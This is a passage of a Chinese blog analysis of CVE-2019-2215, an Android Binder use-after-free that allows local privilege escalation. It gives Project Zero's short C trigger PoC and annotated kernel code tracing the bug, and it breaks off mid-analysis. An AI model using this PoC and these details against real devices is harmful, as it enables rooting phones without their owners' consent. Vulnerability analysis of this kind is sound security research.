<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="CVE-2019-2215分析利用记录"><title>CVE-2019-2215分析利用记录</title><link rel=canonical href=https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/><link rel=stylesheet href=/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css><meta property="og:title" content="CVE-2019-2215分析利用记录"><meta property="og:description" content="CVE-2019-2215分析利用记录"><meta property="og:url" content="https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/"><meta property="og:site_name" content="ykikoqAq"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="CVE"><meta property="article:tag" content="Android提权"><meta property="article:published_time" content="2020-06-30T01:15:26+08:00"><meta property="article:modified_time" content="2020-06-30T01:15:26+08:00"><meta name=twitter:title content="CVE-2019-2215分析利用记录"><meta name=twitter:description content="CVE-2019-2215分析利用记录"><link rel="shortcut icon" href=static/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/wrlt_hu7776bd87ceaee6c7469d733bf0877a3e_443633_300x0_resize_q75_box.jpg width=300 height=296 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>🌈</span></figure><div class=site-meta><h1 class=site-name><a href=/>ykikoqAq</a></h1><h2 class=site-description>学习、吃饭、睡觉。</h2></div></header><ol class=social-menu><li><a href=https://github.com/kuekiko target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/kuekiko7 target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>主页</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/about/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About</span></a></li><li><a href=/reading/><!doctype html><svg t="1667664453010" class="icon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="6741" width="32" height="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M928 161H699.2c-49.1.0-97.1 14.1-138.4 40.7L512 233l-48.8-31.3C422 175.1 373.9 161 324.8 161H96c-17.7.0-32 14.3-32 32v568c0 17.7 14.3 32 32 32h228.8c49.1.0 97.1 14.1 138.4 40.7l44.4 28.6c1.3.8 2.8 1.3 4.3 1.3s3-.4 4.3-1.3l44.4-28.6C602 807.1 650.1 793 699.2 793H928c17.7.0 32-14.3 32-32V193c0-17.7-14.3-32-32-32zM324.8 721H136V233h188.8c35.4.0 69.8 10.1 99.5 29.2l48.8 31.3 6.9 4.5v462c-47.6-25.6-100.8-39-155.2-39zm563.2.0H699.2c-54.4.0-107.6 13.4-155.2 39V298l6.9-4.5 48.8-31.3c29.7-19.1 64.1-29.2 99.5-29.2H888v488z" p-id="6742" fill="#e6e6e6"/><path d="M396.9 361H211.1c-3.9.0-7.1 3.4-7.1 7.5v45c0 4.1 3.2 7.5 7.1 7.5h185.7c3.9.0 7.1-3.4 7.1-7.5v-45c.1-4.1-3.1-7.5-7-7.5zM620 368.5v45c0 4.1 3.2 7.5 7.1 7.5h185.7c3.9.0 7.1-3.4 7.1-7.5v-45c0-4.1-3.2-7.5-7.1-7.5H627.1c-3.9.0-7.1 3.4-7.1 7.5zM396.9 501H211.1c-3.9.0-7.1 3.4-7.1 7.5v45c0 4.1 3.2 7.5 7.1 7.5h185.7c3.9.0 7.1-3.4 7.1-7.5v-45c.1-4.1-3.1-7.5-7-7.5zm416 0H627.1c-3.9.0-7.1 3.4-7.1 7.5v45c0 4.1 3.2 7.5 7.1 7.5h185.7c3.9.0 7.1-3.4 7.1-7.5v-45c.1-4.1-3.1-7.5-7-7.5z" p-id="6743" fill="#e6e6e6"/></svg><span>Reading</span></a></li><li><a href=/todo/><!doctype html><svg t="1667664383494" class="icon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="5558" width="32" height="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M413.866667 853.333333c-14.933333.0-32-6.4-44.8-17.066666l-307.2-302.933334c-12.8-10.666667-19.2-25.6-19.2-42.666666s6.4-32 19.2-42.666667L172.8 339.2c23.466667-23.466667 64-23.466667 87.466667.0l307.2 300.8c12.8 10.666667 19.2 27.733333 19.2 42.666667.0 17.066667-6.4 32-19.2 42.666666l-110.933334 108.8c-10.666667 12.8-27.733333 19.2-42.666666 19.2zm-198.4-490.666666c-4.266667.0-10.666667 2.133333-14.933334 6.4L89.6 477.866667c-2.133333 4.266667-4.266667 8.533333-4.266667 12.8s2.133333 8.533333 6.4 12.8l309.333334 300.8c8.533333 8.533333 19.2 8.533333 27.733333.0l110.933333-108.8c4.266667-4.266667 6.4-8.533333 6.4-12.8s-2.133333-8.533333-6.4-12.8L230.4 369.066667c-4.266667-4.266667-8.533333-6.4-14.933333-6.4z" p-id="5559" fill="#e6e6e6"/><path d="M413.866667 853.333333c-14.933333.0-32-6.4-44.8-17.066666l-110.933334-108.8c-12.8-10.666667-19.2-27.733333-19.2-42.666667.0-17.066667 6.4-32 19.2-42.666667l505.6-497.066666c23.466667-23.466667 64-23.466667 87.466667.0l110.933333 108.8c12.8 10.666667 19.2 27.733333 19.2 42.666666s-6.4 32-19.2 42.666667l-505.6 497.066667c-10.666667 10.666667-27.733333 17.066667-42.666666 17.066666zM808.533333 170.666667c-4.266667.0-10.666667 2.133333-14.933333 6.4l-505.6 492.8c-4.266667 4.266667-6.4 8.533333-6.4 12.8s2.133333 8.533333 6.4 12.8l110.933333 108.8c8.533333 8.533333 19.2 8.533333 27.733334.0l505.6-494.933334c4.266667-4.266667 6.4-8.533333 6.4-12.8s-2.133333-8.533333-6.4-12.8l-110.933334-108.8c-4.266667-2.133333-8.533333-4.266667-12.8-4.266666z" p-id="5560" fill="#e6e6e6"/></svg><span>Todo</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/%E5%8F%8B%E9%93%BE/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>友链</span></a></li><li><a href=/%E7%8E%AF%E5%A2%83%E8%AE%B0%E5%BD%95/><!doctype html><svg t="1667664120722" class="icon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="3601" width="16" height="16" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M895.946487 1024H128.053513V128.124863h128.622073v63.991081H192.044594v767.892975h639.910812V192.115944h-66.230769V128.124863h130.22185V1024z" fill="#e6e6e6" p-id="3602"/><path d="M703.973244 256.107025H320.026756V64.133781h100.146042a95.986622 95.986622.0 01181.09476.0H703.973244zM384.017838 192.115944h255.964324V128.124863h-95.986621V96.129322a31.995541 31.995541.0 00-63.991082.0v31.995541h-95.986621zM319.706801 512.07135h383.946487v63.991081H319.706801zm0 127.982163h383.946487v63.991081H319.706801zm0 127.982162h383.946487v63.991081H319.706801zm0-383.946487h159.977703v63.991081H319.706801z" fill="#e6e6e6" p-id="3603"/></svg><span>环境记录</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://ykiko.top/en/>English</option><option value=https://ykiko.top/ selected>中文</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>暗色模式</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-分析环境>0x01 分析环境</a></li><li><a href=#0x02-漏洞分析>0x02 漏洞分析</a><ol><li><a href=#原理分析>原理分析</a></li><li><a href=#poc调试分析>Poc调试分析</a></li></ol></li><li><a href=#0x03-漏洞利用>0x03 漏洞利用</a><ol><li><a href=#patch-addr_limit>patch addr_limit</a></li><li><a href=#bypass-kaslr-and-disabling-selinux>bypass kaslr and Disabling SELinux</a></li><li><a href=#root>Root</a></li><li><a href=#disabling-seccomp>Disabling SECCOMP</a></li><li><a href=#patch>patch</a></li></ol></li><li><a href=#总结>总结</a><ol><li><a href=#参考>参考</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/cve/>CVE</a>
<a href=/categories/android%E6%8F%90%E6%9D%83/>Android提权</a>
<a href=/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>漏洞分析</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/>CVE-2019-2215分析利用记录</a></h2><h3 class=article-subtitle>CVE-2019-2215分析利用记录</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>2020-08-30</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>阅读时长: 14 分钟</time></div></footer></div></header><section class=article-content><h3 id=0x00-前言>0x00 前言</h3><p><a class=link href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2215" target=_blank rel=noopener>CVE-2019-2215</a>最初是由syzbot(syzkaller bot)在2017年发现的一个<a class=link href=https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/eLGkcwk9AQAJ target=_blank rel=noopener>bug</a>，在2018年初该bug被修复，没有分配CVE编号，但是该补丁没有向后移植到许多已发布的设备上,比如Pixel和pixel2。</p><p><strong>Project Zero</strong>的**Maddie Stone (@maddiestone)**根据Google的威胁情报小组（TAG）的情报报告再次发现的该bug，她在2019年9月报告了该<a class=link href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target=_blank rel=noopener>漏洞</a>。TAG确认其已用于现实攻击中，TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。</p><h3 id=0x01-分析环境>0x01 分析环境</h3><ul><li>Android avd api29 x86_64</li><li>kernel：q-goldfish-android-goldfish-4.14-dev commit id <code>7a3cee43e935b9d526ad07f20bf005ba7e74d05b</code></li><li>pixel Android 10 kernel 3.18</li></ul><h3 id=0x02-漏洞分析>0x02 漏洞分析</h3><p>漏洞为内核上Bind IPC的一个UAF漏洞，成功利用可本地提权，无需进行任何交互，已被恶意软件利用。</p><h4 id=原理分析>原理分析</h4><p>先看一个project-zero公开的<a class=link href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target=_blank rel=noopener>poc</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* 
</span></span></span><span class=line><span class=cl><span class=cm>binder_poll() passes the thread-&gt;wait waitqueue that
</span></span></span><span class=line><span class=cl><span class=cm>can be slept on for work. When a thread that uses
</span></span></span><span class=line><span class=cl><span class=cm>epoll explicitly exits using BINDER_THREAD_EXIT,
</span></span></span><span class=line><span class=cl><span class=cm>the waitqueue is freed, but it is never removed
</span></span></span><span class=line><span class=cl><span class=cm>from the corresponding epoll data structure. When
</span></span></span><span class=line><span class=cl><span class=cm>the process subsequently exits, the epoll cleanup
</span></span></span><span class=line><span class=cl><span class=cm>code tries to access the waitlist, which results in
</span></span></span><span class=line><span class=cl><span class=cm>a use-after-free. 
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/epoll.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#define BINDER_THREAD_EXIT 0x40046208ul
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=n>epfd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>epoll_event</span> <span class=n>event</span> <span class=o>=</span> <span class=p>{.</span><span class=n>events</span> <span class=o>=</span> <span class=n>EPOLLIN</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/binder&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>epfd</span> <span class=o>=</span> <span class=n>epoll_create</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>epoll_ctl</span><span class=p>(</span><span class=n>epfd</span><span class=p>,</span> <span class=n>EPOLL_CTL_ADD</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>event</span><span class=p>);</span> <span class=c1>//[1]
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>BINDER_THREAD_EXIT</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span> <span class=c1>//[2]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>漏洞原理作者说的很简单就是使用epoll线程调用BINDER_THREAD_EXIT时，会把binder_thread释放，但是没有在epoll数据结构中清除，在后面进程结束或者epoll主动调用EPOLL_CTL_DEL时，epoll又会去遍历前面释放的binder_thread->wait，导致UAF。</p><p>既然是个UAF的漏洞，我们主要关注三个点：binder_thread的allocate、free、use。</p><ul><li><strong>allocate</strong></li></ul><p>在poc中的[1]处，通过epoll_ctl创建了一个新的ep_item并且绑定了fd，将其插入到event_poll的红黑树中。fd为前面通过调用open()创建的binder_proc结构体并且<code>fd->pricate_data = binder_proc</code>，epfd为调用epoll_create创建的一个epoll结构体，该结构体会添加到结构体队列上。结构大概如图，<a class=link href=https://github.com/sharif-dev/AndroidKernelVulnerability target=_blank rel=noopener>图来源</a></p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200628024448.png loading=lazy></p><ul><li><strong>free</strong></li></ul><p>poc中的[2]处，调用ioctl对fd进行BINDER_THREAD_EXIT操作，从<code>fd->private_data</code>中释放<strong>binder_thread</strong>结构体。整个调用栈如下图所示。最终调用到了binder_free_thread里的kfree释放掉。</p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200628102722.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>binder_free_thread</span><span class=p>(</span><span class=k>struct</span> <span class=n>binder_thread</span> <span class=o>*</span><span class=kr>thread</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>BUG_ON</span><span class=p>(</span><span class=o>!</span><span class=n>list_empty</span><span class=p>(</span><span class=o>&amp;</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>todo</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=n>binder_stats_deleted</span><span class=p>(</span><span class=n>BINDER_STAT_THREAD</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>binder_proc_dec_tmpref</span><span class=p>(</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>proc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>put_task_struct</span><span class=p>(</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>task</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>kfree</span><span class=p>(</span><span class=kr>thread</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>use</strong></li></ul><p>在当前线程退出时，会自动调用<strong>epoll_ctl(epfd, DEL, fd, event)</strong>，这里面会调用到<strong>ep_remove(event_poll, ep_item)</strong>，这个方法里面会进行unlink wait queues双链表操作，其中的操作<code>entry = wait->entry;</code>这里的指针指向已经释放的binder_thread->wait。造成use after free。</p><p><img src=https://my-md-1253484710.file.myqcloud.com/eq_remove_queue.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>ep_remove_wait_queue</span><span class=p>(</span><span class=k>struct</span> <span class=n>eppoll_entry</span> <span class=o>*</span><span class=n>pwq</span><span class=p>)</span>  <span class=c1>//这里的pwq就是我们已经释放掉的binder_thread
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>wait_queue_head_t</span> <span class=o>*</span><span class=n>whead</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>rcu_read_lock</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=n>whead</span> <span class=o>=</span> <span class=n>smp_load_acquire</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pwq</span><span class=o>-&gt;</span><span class=n>whead</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>whead</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>remove_wait_queue</span><span class=p>(</span><span class=n>whead</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pwq</span><span class=o>-&gt;</span><span class=n>wait</span><span class=p>);</span> <span class=c1>//进入remove_wait_queue
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>rcu_read_unlock</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>remove_wait_queue</span><span class=p>(</span><span class=k>struct</span> <span class=n>wait_queue_head</span> <span class=o>*</span><span class=n>wq_head</span><span class=p>,</span> <span class=k>struct</span> <span class=n>wait_queue_entry</span> <span class=o>*</span><span class=n>wq_entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>spin_lock_irqsave</span><span class=p>(</span><span class=o>&amp;</span><span class=n>wq_head</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>__remove_wait_queue</span><span class=p>(</span><span class=n>wq_head</span><span class=p>,</span> <span class=n>wq_entry</span><span class=p>);</span>  <span class=c1>//这里传入的第二个参数&amp;pwq-&gt;wait之前已经被释放
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>spin_unlock_irqrestore</span><span class=p>(</span><span class=o>&amp;</span><span class=n>wq_head</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>__remove_wait_queue</span><span class=p>(</span><span class=k>struct</span> <span class=n>wait_queue_head</span> <span class=o>*</span><span class=n>wq_head</span><span class=p>,</span> <span class=k>struct</span> <span class=n>wait_queue_entry</span> <span class=o>*</span><span class=n>wq_entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>list_del</span><span class=p>(</span><span class=o>&amp;</span><span class=n>wq_entry</span><span class=o>-&gt;</span><span class=n>entry</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>list_del</span><span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span><span class=n>entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>__list_del_entry</span><span class=p>(</span><span class=n>entry</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>__list_del_entry</span><span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span><span class=n>entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
